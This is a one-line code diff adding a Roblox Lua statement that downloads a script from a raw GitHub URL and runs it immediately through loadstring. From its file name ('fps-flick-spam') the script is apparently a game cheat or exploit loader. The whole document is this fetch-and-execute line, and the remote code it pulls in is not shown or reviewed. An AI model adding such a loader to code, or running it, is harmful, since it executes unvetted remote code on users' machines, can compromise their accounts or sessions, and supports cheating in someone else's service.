@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/fps-flick-spam0-gwa4rk3koflhdw.lua"))()
